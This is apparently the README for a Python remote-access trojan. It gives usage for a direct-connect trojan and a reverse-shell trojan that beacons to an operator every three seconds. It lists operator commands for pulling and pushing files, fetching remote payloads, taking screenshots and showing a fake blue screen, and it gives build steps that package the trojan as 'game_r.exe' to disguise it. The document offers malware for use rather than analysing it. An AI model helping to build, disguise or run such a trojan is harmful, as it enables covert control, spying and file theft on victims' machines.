traditional trojan:
    python trojan.py [IP]   - trojan
    python shell.py         - terminal for hacker

reverse shell trojan:
    python shell_r.py       - terminal of reverse shell
    python trojan_r.py [IP] - trojan connect to server every 3 seconds

command available:
    all shell commands
    put        - send file to trojan
                 Example: put local_FileName [remove_FileName]
    upload     - same as above
    get        - get file from trojan
                 Example: get remove_FileName [local_FileName]
    download   - same as above
    fetch      - download from HTTP server
                 Example: fetch http/https/URL [local_FileName]
    screenshot - get screenshot and display
    bluescreen - display fake blue screen for joking

build trojan (reverse shell version):
    type the following command:

        python setup.py

    you can find the dist/game_r.exe, it is the trojan.
